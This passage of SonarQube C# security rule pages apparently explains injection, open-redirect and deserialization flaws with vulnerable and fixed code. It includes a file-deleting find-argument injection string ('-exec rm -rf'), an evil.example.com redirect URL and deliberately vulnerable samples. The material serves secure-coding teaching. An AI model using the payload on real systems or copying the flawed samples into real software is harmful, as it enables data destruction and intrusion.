<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br />
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br /> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul><li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li><li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li></ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br /> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br /> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<p>In the code samples, a pre-approved class is used natively by JsonSerializer to validate the class during serialization. XmlSerializer also
provides this capability.<br /> <strong>Note</strong>: The pre-approved class should not tamper with the application’s inner workings.</p>
<p>The following native types are considered unsafe because they do not provide these capabilities:</p>
<ul><li> <code>BinaryFormatter</code> </li><li> <code>SoapFormatter</code> </li><li> <code>NetDataContractSerializer</code> </li><li> <code>LosFormatter</code> </li><li> <code>ObjectStateFormatter</code> </li></ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5146">
              roslyn.sonaranalyzer.security.cs:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public void Redirect(string url)
    {
        Response.Redirect(url);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private readonly string[] allowedUrls &#61; { &#34;/&#34;, &#34;/login&#34;, &#34;/logout&#34; };

    [HttpGet]
    public void Redirect(string url)
    {
        if (allowedUrls.Contains(url))
        {
            Response.Redirect(url);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2078">
              roslyn.sonaranalyzer.security.cs:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated in an LDAP query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Authenticate(string user, string pass)
    {
        DirectoryEntry directory  &#61; new DirectoryEntry(&#34;LDAP://ou&#61;system&#34;);
        DirectorySearcher search  &#61; new DirectorySearcher(directory);

        search.Filter &#61; &#34;(&amp;(uid&#61;&#34; &#43; user &#43; &#34;)(userPassword&#61;&#34; &#43; pass &#43; &#34;))&#34;;

        return Json(search.FindOne() !&#61; null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public IActionResult Authenticate(string user, string pass)
    {
        // restrict the username and password to letters only
        if (!Regex.IsMatch(user, &#34;^[a-zA-Z]&#43;$&#34;) || !Regex.IsMatch(pass, &#34;^[a-zA-Z]&#43;$&#34;))
        {
            return BadRequest();
        }

        DirectoryEntry directory  &#61; new DirectoryEntry(&#34;LDAP://ou&#61;system&#34;);
        DirectorySearcher search  &#61; new DirectorySearcher(directory);

        search.Filter &#61; &#34;(&amp;(uid&#61;&#34; &#43; user &#43; &#34;)(userPassword&#61;&#34; &#43; pass &#43; &#34;))&#34;;

        return Json(search.FindOne() !&#61; null);
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul><li> <code>\</code> </li><li> <code>#</code> </li><li> <code>&#43;</code> </li><li> <code>&lt;</code> </li><li> <code>&gt;</code> </li><li> <code>,</code> </li><li> <code>;</code> </li><li> <code>&#34;</code> </li><li> <code>&#61;</code> </li></ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul><li> <code>*</code> </li><li> <code>(</code> </li><li> <code>)</code> </li><li> <code>\</code> </li><li> <code>null</code> </li></ul>
<p>In the compliant solution example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic
characters.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.ietf.org/rfc/rfc4514.txt" rel="nofollow">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li><li> <a href="https://www.ietf.org/rfc/rfc4515.txt" rel="nofollow">RFC 4515</a> - LDAP: String Representation of Search Filters </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/90" rel="nofollow">MITRE, CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query
  (&#39;LDAP Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5883">
              roslyn.sonaranalyzer.security.cs:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br /> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to arguments injection because untrusted data is inserted directly into the arguments of a process call without sanitization.<br />
The application assumes that incoming data always consists of a specific range of characters and ignores that some characters might force the
<code>find</code> command to start a shell.</p>
<p>In this particular case, an attacker may remove files in <code>/some/folder</code> with the following string:</p>
<pre>
&#39;*&#39; -exec rm -rf {} \;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public void Run(string args)
    {
        Process p             &#61; new Process();
        p.StartInfo.FileName  &#61; &#34;/usr/bin/find&#34;;
        p.StartInfo.Arguments &#61; &#34;/some/folder -iname &#34; &#43; args;
        p.Start();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public void Run(string args)
    {
        Process p            &#61; new Process();
        p.StartInfo.FileName &#61; &#34;/usr/bin/find&#34;;
        p.StartInfo.ArgumentList.Add(&#34;/some/folder&#34;);
        p.StartInfo.ArgumentList.Add(&#34;-iname&#34;);
        p.StartInfo.ArgumentList.Add(args);
        p.Start();
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>Here <code>ArgumentList</code> takes care of escaping the passed arguments and internally creates a single string given to the operating system
when <code>System.Diagnostics.Process.Start()</code> is called.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6641">
              roslyn.sonaranalyzer.security.cs:S6641
            </a>
          </td>
          <td>
            <details>
              <p>Database connection strings control how an application connects to a database. They include information such as the location of the database, how
to authenticate with the database, and how the connection should be secured.</p>
<p>The insertion of user-supplied values into a connection string can allow external control of these database connections.</p>
<h2>Why is this an issue?</h2>
<p>Connection strings contain a series of parameters that are structured as key/value pairs, similar to <code>key1&#61;value1;key2&#61;value2</code>.</p>
<p>If an attacker can control values that are inserted into the connection string, they may be able to insert additional parameters. These additional
parameters can override values that were supplied earlier in the connection string.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use specially-crafted values to change how the database connection is made. These values can add new parameters to the connection
string, or can override parameters that had already been specified.</p>
<h4>Escalation of privilege</h4>
<p>Some database servers allow authentication via an OS user account instead of a username and password. The database connection is authenticated as
the user running the application. When this authentication mode is used, any username or password in the connection string are ignored.</p>
<p>If an attacker can force the use of this authentication mode, the connection will be made as the user that the web application is running under.
This will often be the <code>LocalSystem</code> or <code>NetworkService</code> account on Windows. Such accounts are often given a high level of
privileges on the database server.</p>
<h4>Credential theft</h4>
<p>If an attacker can change the database server in the connection string, they can have the web application connect to a server that they control.
The web application will then authenticate with that server, allowing those credentials to be stolen.</p>
<h4>Bypassing data validation</h4>
<p>Many web applications implicitly trust data that’s stored in the database. The data is validated before it is stored, so no additional validation
is performed when that data is loaded.</p>
<p>If an attacker can change the database server in the connection string, they can have the web application connect to a database server that they
control. Invalid data in this database could be passed to other services or systems, or could be used to trigger other bugs and logic flaws in the web
application.</p>
<h4>Network traffic sniffing</h4>
<p>The connection string can control how the connection to the database server is secured. For example, it can control whether connections to
Microsoft SQL Server use transport layer security (TLS).</p>
<p>If an attacker can disable these network security measures and they have some way to monitor traffic between the web server and the database
server, they will be able to see all information that’s written to and read from the database.</p>
<h2>How to fix it in .NET</h2>
<p>Microsoft’s database connection libraries typically provide a connection string builder class. These classes provide methods and properties that
safely set parameter values.</p>
<p>Connection string builders will only protect you if you use these methods and properties to set parameter values. They will not help if you are
using them to modify a connection string where user-supplied values have already been added.</p>
<p>If no connection string builder is available, user-supplied values must either be validated to ensure that they’re not malicious, or must be
properly quoted so that they cannot interfere with other connection string parameters.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public string ConnectionString { get; set; } &#61; &#34;Server&#61;10.0.0.101;Database&#61;CustomerData&#34;;

public SqlConnection ConnectToDatabase(HttpRequest request)
{
    string connectionString &#61; string.Format(&#34;{0};User ID&#61;{1};Password&#61;{2}&#34;,
        ConnectionString,
        request.Form[&#34;username&#34;],
        request.Form[&#34;password&#34;]);

    SqlConnection connection &#61; new SqlConnection();
    connection.ConnectionString &#61; connectionString; // Noncompliant
    connection.Open();
    return connection;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public string ConnectionString { get; set; } &#61; &#34;Server&#61;10.0.0.101;Database&#61;CustomerData&#34;;

public SqlConnection ConnectToDatabase(HttpRequest request)
{
    SqlConnectionStringBuilder builder &#61; new SqlConnectionStringBuilder(ConnectionString);
    builder.UserID &#61; request.Form[&#34;username&#34;];
    builder.Password &#61; request.Form[&#34;password&#34;];

    SqlConnection connection &#61; new SqlConnection();
    connection.ConnectionString &#61; builder.ConnectionString;
    connection.Open();
    return connection;
}
</pre>
<h3>How does this work?</h3>
<p>Connection string builders will ensure that values are correctly sanitized when adding them to the connection string.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> Microsoft - <a href="https://learn.microsoft.com/en-us/dotnet/framework/data/adonet/connection-string-syntax" rel="nofollow">Connection string syntax</a>
  </li></ul>
<h3>Conference presentations</h3>
<ul><li> DefCon 18: Alonso Palazon, Connection String Attacks - <a href="https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String.pdf" rel="nofollow">presentation</a>, <a href="https://media.defcon.org/DEF%20CON%2018/DEF%20CON%2018%20presentations/DEF%20CON%2018%20-%20Alonso-Palazon-String-wp.pdf" rel="nofollow">white paper</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/15.html" rel="nofollow">MITRE, CWE15</a> - External Control of System or Configuration Setting </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5145">
              roslyn.sonaranalyzer.security.cs:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br /> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br /> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br /></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private static readonly log4net.ILog _logger &#61; log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);

    [HttpGet]
    public void Log(string data)
    {
        if (data !&#61; null)
        {
            _logger.Info(&#34;Log: &#34; &#43; data); // Noncompliant
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private static readonly log4net.ILog _logger &#61; log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);

    [HttpGet]
    public void Log(string data)
    {
        if (data !&#61; null)
        {
            data &#61; data.Replace(&#39;\n&#39;, &#39;_&#39;).Replace(&#39;\r&#39;, &#39;_&#39;);
            _logger.Info(&#34;Log: &#34; &#43; data);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br /> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5167">
              roslyn.sonaranalyzer.security.cs:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS5122&amp;rule_key&#61;csharpsquid%3AS5122" rel="nofollow">S5122</a>, <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS5146&amp;rule_key&#61;csharpsquid%3AS5146" rel="nofollow">S5146</a>, <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS6287&amp;rule_key&#61;csharpsquid%3AS6287" rel="nofollow">S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
string value &#61; Request.QueryString[&#34;value&#34;];
Response.AddHeader(&#34;X-Header&#34;, value); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
string value &#61; Request.QueryString[&#34;value&#34;];
// Allow only alphanumeric characters
if (value &#61;&#61; null || !Regex.IsMatch(value, &#34;^[a-zA-Z0-9]&#43;$&#34;))
{
  throw new Exception(&#34;Invalid value&#34;);
}
Response.AddHeader(&#34;X-Header&#34;, value);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" rel="nofollow">OWASP Attack Category</a> - HTTP Response Splitting </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/113" rel="nofollow">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers (&#39;HTTP
  Response Splitting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2076">
              roslyn.sonaranalyzer.security.cs:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public void Run(string binary)
    {
        Process p &#61; new Process();
        p.StartInfo.FileName &#61; binary;
        p.Start();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public void Run(string binary)
    {
        if (binary.Equals(&#34;/usr/bin/ls&#34;) || binary.Equals(&#34;/usr/bin/cat&#34;))
        {
            // only ls and cat commands are authorized
            Process p &#61; new Process();
            p.StartInfo.FileName &#61; binary;
            p.Start();
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
